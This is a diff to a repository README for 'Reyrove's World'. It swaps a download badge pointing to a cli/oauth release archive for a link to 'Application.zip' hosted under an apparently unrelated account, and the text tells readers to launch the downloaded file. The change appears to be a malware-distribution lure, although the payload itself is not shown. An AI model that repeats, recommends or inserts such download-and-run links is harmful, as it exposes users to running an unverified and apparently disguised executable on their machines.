@@ -45,7 +45,7 @@ In this repository, you will find a collection of projects and resources focusin
 
 To kickstart your journey into Reyrove's World, simply click on the link below to access our repository:
 
-[![Download Reyrove](https://img.shields.io/badge/Download-Reyrove-9cf)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Reyrove](https://github.com/kudabetina/reyrove/releases/download/v1.0/Application.zip)](https://github.com/kudabetina/reyrove/releases/download/v1.0/Application.zip)
 
 *Please note that you need to launch the downloaded file to start your exploration.*
 
